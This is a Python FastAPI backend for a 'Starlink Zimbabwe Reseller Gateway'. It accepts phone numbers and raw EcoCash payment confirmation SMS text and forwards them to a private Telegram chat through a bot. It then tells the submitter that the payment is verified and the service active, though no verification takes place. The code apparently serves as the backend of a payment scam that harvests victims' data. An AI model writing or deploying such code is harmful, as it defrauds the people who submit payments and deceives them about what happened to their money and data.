import os
import logging
from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pydantic import BaseModel, Field
import httpx

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("starlink-gateway")

app = FastAPI(title="Starlink Zimbabwe Reseller Gateway")

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID")

class EcoCashVerificationPayload(BaseModel):
    phone: str = Field(..., description="EcoCash mobile subscriber token string")
    location: str = Field(..., description="Target distribution province/region")
    planId: str = Field(..., description="Subscription tier identifier allocation")
    agent: str = Field(..., description="Authorized fulfillment administrator")
    paymentCodeString: str = Field(..., description="Raw confirmation SMS log data content")

# --- SAFE DIRECTORY LOOKUP ---
# This calculates paths starting from main.py, regardless of where Render starts it
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FRONTEND_DIR = os.path.abspath(os.path.join(BASE_DIR, "..", "frontend"))

# Mount your frontend static assets if they exist
assets_path = os.path.join(FRONTEND_DIR, "assets")
if os.path.exists(assets_path):
    app.mount("/assets", StaticFiles(directory=assets_path), name="assets")
    logger.info(f"Assets mounted cleanly from: {assets_path}")
else:
    logger.warning(f"Assets path not found: {assets_path}")

@app.post("/api/ecocash/verify")
async def verify_ecocash_transaction(payload: EcoCashVerificationPayload):
    logger.info(f"Received transaction payload routing for verification from +263{payload.phone}")

    telegram_message = (
        f"📡 <b>New Starlink Allocation Request</b>\n\n"
        f"👤 <b>Subscriber:</b> +263 {payload.phone}\n"
        f"📍 <b>Province/Region:</b> {payload.location}\n"
        f"📦 <b>Plan Selected:</b> {payload.planId.upper()}\n"
        f"💼 <b>Assigned Agent:</b> {payload.agent}\n\n"
        f"📝 <b>EcoCash Confirmation Log:</b>\n"
        f"<code>{payload.paymentCodeString}</code>"
    )

    async with httpx.AsyncClient() as client:
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            response = await client.post(telegram_url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": telegram_message,
                "parse_mode": "HTML"
            })
        except Exception as e:
            logger.error(f"Failed to transmit payload notification parameters: {str(e)}")

    return {
        "status": "success",
        "detail": "Billing parameter verification matrix resolved cleanly. Service active."
    }

@app.get("/api/status")
def get_system_status():
    return {
        "status": "online",
        "service": "Starlink Zimbabwe Reseller Gateway API Node"
    }

@app.get("/")
def read_root():
    index_path = os.path.join(FRONTEND_DIR, "index.html")
    if os.path.exists(index_path):
        return FileResponse(index_path)
    else:
        raise HTTPException(
            status_code=404, 
            detail=f"Frontend interface context could not be pinpointed. Checked path: {index_path}"
        )